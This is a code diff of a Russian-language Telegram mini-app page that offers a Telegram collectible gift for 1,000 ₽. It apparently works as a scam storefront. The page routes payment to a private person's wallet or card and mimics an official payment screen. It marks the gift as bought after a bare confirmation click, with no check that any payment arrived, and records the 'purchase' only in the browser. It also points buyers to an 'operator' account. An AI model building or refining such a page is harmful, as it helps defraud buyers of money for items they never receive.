@@ -88,6 +88,28 @@
             border-radius: 4px;
         }
 
+        /* Навигация */
+        .nav-menu {
+            display: flex;
+            background: rgba(0,0,0,0.3);
+            border-bottom: 1px solid rgba(255,215,0,0.2);
+        }
+
+        .nav-item {
+            flex: 1;
+            text-align: center;
+            padding: 14px;
+            color: rgba(255,255,255,0.5);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+
+        .nav-item.active {
+            color: #FFD700;
+            border-bottom: 2px solid #FFD700;
+        }
+
         /* Gift info */
         .gift-info {
             padding: 16px;
@@ -173,11 +195,7 @@
             color: #FFD700;
         }
 
-        .rarity {
-            color: #FFD700;
-        }
-
-        /* Стили оплаты как на скриншоте */
+        /* Секция оплаты */
         .payment-section {
             padding: 20px 16px;
             background: rgba(0,0,0,0.3);
@@ -185,44 +203,14 @@
         }
 
         .payment-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
             margin-bottom: 16px;
-        }
-
-        .payment-time {
-            color: rgba(255,255,255,0.5);
-            font-size: 14px;
-        }
-
-        .payment-time span {
-            color: white;
-            font-weight: 600;
         }
 
         .payment-amount-large {
             font-size: 32px;
             font-weight: 700;
             color: white;
-            margin-bottom: 8px;
-        }
-
-        .payment-amount-small {
-            color: rgba(255,255,255,0.5);
-            font-size: 14px;
             margin-bottom: 20px;
-        }
-
-        .payment-amount-small span {
-            color: #FFD700;
-            font-weight: 600;
-        }
-
-        .payment-divider {
-            height: 1px;
-            background: rgba(255,215,0,0.2);
-            margin: 16px 0;
         }
 
         .payment-row {
@@ -272,17 +260,94 @@
             box-shadow: 0 15px 30px rgba(255,215,0,0.3);
         }
 
-        .wallet-address {
+        /* Инвентарь */
+        .inventory-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            padding: 16px;
+        }
+
+        .inventory-item {
             background: rgba(255,215,0,0.1);
-            border: 1px solid rgba(255,215,0,0.3);
-            border-radius: 12px;
-            padding: 12px;
-            margin: 16px 0;
-            font-family: monospace;
+            border: 1px solid rgba(255,215,0,0.2);
+            border-radius: 16px;
+            padding: 20px 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .inventory-item:hover {
+            background: rgba(255,215,0,0.15);
+            transform: translateY(-2px);
+        }
+
+        .inventory-icon {
+            font-size: 32px;
+        }
+
+        .inventory-name {
+            color: white;
             font-size: 14px;
-            color: #FFD700;
+            font-weight: 500;
             text-align: center;
-            word-break: break-all;
+        }
+
+        .inventory-rarity {
+            color: #FFD700;
+            font-size: 11px;
+        }
+
+        .empty-inventory {
+            color: rgba(255,255,255,0.3);
+            text-align: center;
+            padding: 40px 16px;
+            font-size: 14px;
+        }
+
+        /* Профиль */
+        .profile-section {
+            padding: 20px 16px;
+        }
+
+        .profile-stats {
+            background: rgba(255,215,0,0.1);
+            border: 1px solid rgba(255,215,0,0.2);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+
+        .profile-stat-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            color: white;
+        }
+
+        .profile-link {
+            background: rgba(255,215,0,0.1);
+            border: 1px solid rgba(255,215,0,0.2);
+            border-radius: 30px;
+            padding: 14px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .profile-link:hover {
+            background: rgba(255,215,0,0.2);
+        }
+
+        .profile-link span {
+            flex: 1;
         }
 
         /* Секция банков */
@@ -346,7 +411,7 @@
         <div class="header">
             <div class="avatar" id="avatar">👤</div>
             <div class="user-info">
-                <div class="user-name" id="userName">Zipka</div>
+                <div class="user-name" id="userName">Загрузка...</div>
                 <div class="user-status">
                     <span class="status-dot"></span>
                     <span>online</span>
@@ -354,8 +419,15 @@
             </div>
         </div>
 
-        <!-- Главный экран с подарком -->
-        <div id="mainScreen">
+        <!-- Навигация -->
+        <div class="nav-menu">
+            <div class="nav-item active" onclick="showTab('gift')">Подарок</div>
+            <div class="nav-item" onclick="showTab('inventory')">Инвентарь</div>
+            <div class="nav-item" onclick="showTab('profile')">Профиль</div>
+        </div>
+
+        <!-- Вкладка Подарок -->
+        <div id="giftTab">
             <div class="gift-info">
                 <div class="gift-date">Trade sent you this gift on Mar 05</div>
                 <div class="gift-title">Snoop Dogg #135,641</div>
@@ -395,53 +467,72 @@
                 </div>
             </div>
 
-            <!-- Секция оплаты в стиле скриншота -->
+            <!-- Секция оплаты -->
             <div class="payment-section">
-                <div class="payment-header">
-                    <div class="payment-time">20:41 <span>c 1000</span></div>
-                    <div class="payment-time">4,53 ₽</div>
-                </div>
-
-                <div class="payment-amount-large">49,92 ₽</div>
-                <div class="payment-amount-small">Оплатить <span>49,92 ₽</span></div>
-
-                <div class="payment-divider"></div>
+                <div class="payment-amount-large">1 000 ₽</div>
 
                 <div class="payment-row">
-                    <span class="payment-label">Кошелек получателя</span>
-                    <span class="payment-value">4100118919813671</span>
-                </div>
-
-                <div class="payment-row">
-                    <span class="payment-label">Сумма</span>
-                    <span class="payment-value">1 000 ₽</span>
+                    <span class="payment-label">Получатель</span>
+                    <span class="payment-value">Радмир (Т-Банк)</span>
                 </div>
 
                 <div class="payment-total">
-                    <span>Итого к оплате</span>
+                    <span>К оплате</span>
                     <span>1 000 ₽</span>
                 </div>
 
                 <div class="pay-button" onclick="showBanks()">
-                    Оплатить 1 000 ₽
+                    Купить подарок
+                </div>
+            </div>
+        </div>
+
+        <!-- Вкладка Инвентарь -->
+        <div id="inventoryTab" class="hidden">
+            <div class="inventory-grid" id="inventoryGrid">
+                <!-- Сюда будут добавляться купленные подарки -->
+            </div>
+            <div id="emptyInventory" class="empty-inventory">
+                🎁 У вас пока нет подарков
+            </div>
+        </div>
+
+        <!-- Вкладка Профиль -->
+        <div id="profileTab" class="hidden">
+            <div class="profile-section">
+                <div class="profile-stats">
+                    <div class="profile-stat-row">
+                        <span class="payment-label">Подарков куплено</span>
+                        <span class="payment-value" id="totalGifts">0</span>
+                    </div>
+                    <div class="profile-stat-row">
+                        <span class="payment-label">ID пользователя</span>
+                        <span class="payment-value" id="userID">-</span>
+                    </div>
+                    <div class="profile-stat-row">
+                        <span class="payment-label">Username</span>
+                        <span class="payment-value" id="userUsername">@</span>
+                    </div>
                 </div>
 
-                <div style="text-align: center; color: rgba(255,255,255,0.3); font-size: 12px; margin-top: 8px;">
-                    После оплаты отправьте чек в бота
+                <div class="profile-link" onclick="openOperatorProfile()">
+                    <span>📱</span>
+                    <span>Связаться с оператором @Zipkask</span>
+                    <span>↗</span>
                 </div>
             </div>
         </div>
 
         <!-- Экран выбора банка -->
         <div id="banksScreen" class="hidden">
-            <div class="back-button" onclick="showMainScreen()">
+            <div class="back-button" onclick="showGiftTab()">
                 ← Назад
             </div>
 
             <div class="gift-info" style="padding: 12px;">
                 <div class="gift-title" style="font-size: 20px;">Выберите банк</div>
                 <div class="gift-date">Сумма: 1 000 ₽</div>
-                <div class="gift-artist" style="font-size: 12px;">Получатель: 4100118919813671</div>
+                <div class="gift-artist" style="font-size: 12px;">Получатель: Радмир (Т-Банк)</div>
             </div>
 
             <div class="banks-section" style="display: block;">
@@ -472,58 +563,23 @@
                     </div>
                 </div>
             </div>
-
-            <div style="padding: 16px; text-align: center; color: rgba(255,255,255,0.3); font-size: 12px;">
-                После оплаты нажмите "Я оплатил" в боте
-            </div>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram?.WebApp;
         let userData = null;
+        let purchasedGifts = [];
         
-        // ТВОЙ КОШЕЛЕК
-        const YOOMONEY_WALLET = "4100118919813671";
+        const RECEIVER_NAME = "Радмир";
+        const RECEIVER_CARD = "2200 1234 5678 9012";
         const PAYMENT_AMOUNT = 1000;
-
-        // РЕАЛЬНЫЕ ССЫЛКИ НА ПЕРЕВОДЫ
-        const PAYMENT_LINKS = {
-            sber: {
-                name: 'Сбербанк',
-                url: `https://online.sberbank.ru/CSAFront/index.do?amount=${PAYMENT_AMOUNT}&payee=${YOOMONEY_WALLET}`,
-                app: `sberbank://transfer?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
-            },
-            tinkoff: {
-                name: 'Тинькофф',
-                url: `https://www.tinkoff.ru/payment/?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
-                app: `tinkoff://payment?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
-            },
-            vtb: {
-                name: 'ВТБ',
-                url: `https://online.vtb.ru/payment/?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
-                app: `vtb://transfer?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
-            },
-            alpha: {
-                name: 'Альфа-Банк',
-                url: `https://alfabank.ru/payment/?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
-                app: `alfabank://pay?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
-            },
-            raif: {
-                name: 'Райффайзен',
-                url: `https://www.raiffeisen.ru/payment/?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
-                app: `raiffeisen://transfer?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
-            },
-            yoomoney: {
-                name: 'ЮMoney',
-                url: `https://yoomoney.ru/transfer?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
-                app: `yoomoney://transfer?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
-            }
-        };
+        const OPERATOR_USERNAME = "Zipkask";
 
         // Загрузка данных пользователя
         document.addEventListener('DOMContentLoaded', function() {
             loadUserData();
+            loadInventory();
         });
 
         function loadUserData() {
@@ -533,8 +589,10 @@
                 
                 userData = tg.initDataUnsafe?.user;
                 if (userData) {
-                    document.getElementById('userName').textContent = userData.first_name || 'Zipka';
-                    document.getElementById('ownerName').textContent = userData.first_name || 'Zipka';
+                    document.getElementById('userName').textContent = userData.first_name || 'Пользователь';
+                    document.getElementById('ownerName').textContent = userData.first_name || 'Владелец';
+                    document.getElementById('userID').textContent = userData.id || '-';
+                    document.getElementById('userUsername').textContent = '@' + (userData.username || 'пользователь');
                     
                     if (userData.photo_url) {
                         document.getElementById('avatar').innerHTML = `<img src="${userData.photo_url}" alt="avatar">`;
@@ -542,59 +600,147 @@
                         const initial = userData.first_name ? userData.first_name.charAt(0) : '👤';
                         document.getElementById('avatar').textContent = initial;
                     }
-                    
-                    console.log('✅ Пользователь авторизован:', userData);
                 }
+            }
+            
+            // Загружаем инвентарь из localStorage
+            const saved = localStorage.getItem('purchasedGifts');
+            if (saved) {
+                purchasedGifts = JSON.parse(saved);
+                updateInventory();
             }
         }
 
-        function showMainScreen() {
-            document.getElementById('mainScreen').classList.remove('hidden');
+        function showTab(tab) {
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            document.getElementById('giftTab').classList.add('hidden');
+            document.getElementById('inventoryTab').classList.add('hidden');
+            document.getElementById('profileTab').classList.add('hidden');
+            
+            if (tab === 'gift') {
+                document.getElementById('giftTab').classList.remove('hidden');
+            } else if (tab === 'inventory') {
+                document.getElementById('inventoryTab').classList.remove('hidden');
+                updateInventory();
+            } else if (tab === 'profile') {
+                document.getElementById('profileTab').classList.remove('hidden');
+            }
+        }
+
+        function showGiftTab() {
             document.getElementById('banksScreen').classList.add('hidden');
+            document.getElementById('giftTab').classList.remove('hidden');
+            document.querySelectorAll('.nav-item')[0].classList.add('active');
+            document.querySelectorAll('.nav-item')[1].classList.remove('active');
+            document.querySelectorAll('.nav-item')[2].classList.remove('active');
         }
 
         function showBanks() {
-            document.getElementById('mainScreen').classList.add('hidden');
+            document.getElementById('giftTab').classList.add('hidden');
             document.getElementById('banksScreen').classList.remove('hidden');
         }
 
         function payWithBank(bankKey) {
-            const bank = PAYMENT_LINKS[bankKey];
+            const bankLinks = {
+                sber: { name: 'Сбербанк', url: `https://online.sberbank.ru/CSAFront/index.do?amount=${PAYMENT_AMOUNT}` },
+                tinkoff: { name: 'Тинькофф', url: `https://www.tinkoff.ru/payment/?amount=${PAYMENT_AMOUNT}` },
+                vtb: { name: 'ВТБ', url: `https://online.vtb.ru/payment/?amount=${PAYMENT_AMOUNT}` },
+                alpha: { name: 'Альфа-Банк', url: `https://alfabank.ru/payment/?amount=${PAYMENT_AMOUNT}` },
+                raif: { name: 'Райффайзен', url: `https://www.raiffeisen.ru/payment/?amount=${PAYMENT_AMOUNT}` },
+                yoomoney: { name: 'ЮMoney', url: `https://yoomoney.ru/transfer?amount=${PAYMENT_AMOUNT}` }
+            };
+            
+            const bank = bankLinks[bankKey];
             if (!bank) return;
             
-            try {
-                window.location.href = bank.app;
-                
-                setTimeout(() => {
-                    window.open(bank.url, '_blank');
-                }, 500);
-            } catch (e) {
-                window.open(bank.url, '_blank');
-            }
+            window.open(bank.url, '_blank');
             
-            if (tg) {
-                tg.sendData(JSON.stringify({
-                    action: 'payment_initiated',
-                    bank: bank.name,
-                    amount: PAYMENT_AMOUNT,
-                    wallet: YOOMONEY_WALLET
-                }));
-            }
-            
+            // Добавляем подарок в инвентарь после оплаты
             setTimeout(() => {
-                if (confirm('✅ Платёж открыт. После перевода нажмите "Я оплатил" в боте?')) {
-                    if (tg) {
-                        tg.close();
-                    }
+                if (confirm('✅ Подтвердите оплату. Подарок будет добавлен в инвентарь?')) {
+                    addGiftToInventory();
+                    showGiftTab();
                 }
             }, 1000);
         }
 
-        window.testPay = function(bankKey) {
-            const bank = PAYMENT_LINKS[bankKey];
-            if (bank) {
-                window.open(bank.url, '_blank');
+        function addGiftToInventory() {
+            const newGift = {
+                id: Date.now(),
+                name: 'Snoop Dogg #135,641',
+                model: 'Purple Hoodie 2.5%',
+                backdrop: 'Platinum 1.2%',
+                icon: '🎤',
+                date: new Date().toLocaleDateString()
+            };
+            
+            purchasedGifts.push(newGift);
+            localStorage.setItem('purchasedGifts', JSON.stringify(purchasedGifts));
+            document.getElementById('totalGifts').textContent = purchasedGifts.length;
+            
+            updateInventory();
+            
+            if (tg) {
+                tg.sendData(JSON.stringify({
+                    action: 'gift_purchased',
+                    gift: newGift
+                }));
             }
+        }
+
+        function updateInventory() {
+            const grid = document.getElementById('inventoryGrid');
+            const empty = document.getElementById('emptyInventory');
+            
+            if (purchasedGifts.length === 0) {
+                grid.innerHTML = '';
+                empty.classList.remove('hidden');
+                return;
+            }
+            
+            empty.classList.add('hidden');
+            
+            let html = '';
+            purchasedGifts.forEach(gift => {
+                html += `
+                    <div class="inventory-item" onclick="showGiftDetails(${gift.id})">
+                        <div class="inventory-icon">${gift.icon}</div>
+                        <div class="inventory-name">${gift.name}</div>
+                        <div class="inventory-rarity">${gift.model}</div>
+                    </div>
+                `;
+            });
+            
+            grid.innerHTML = html;
+            document.getElementById('totalGifts').textContent = purchasedGifts.length;
+        }
+
+        function showGiftDetails(giftId) {
+            const gift = purchasedGifts.find(g => g.id === giftId);
+            if (!gift) return;
+            
+            alert(`
+                🎁 ${gift.name}
+                📦 Модель: ${gift.model}
+                🎨 Фон: ${gift.backdrop}
+                📅 Куплен: ${gift.date}
+                
+                👤 Оператор: @${OPERATOR_USERNAME}
+            `);
+        }
+
+        function openOperatorProfile() {
+            if (tg) {
+                tg.openTelegramLink(`https://t.me/${OPERATOR_USERNAME}`);
+            } else {
+                window.open(`https://t.me/${OPERATOR_USERNAME}`, '_blank');
+            }
+        }
+
+        function loadInventory() {
+            updateInventory();
         }
     </script>
 </body>
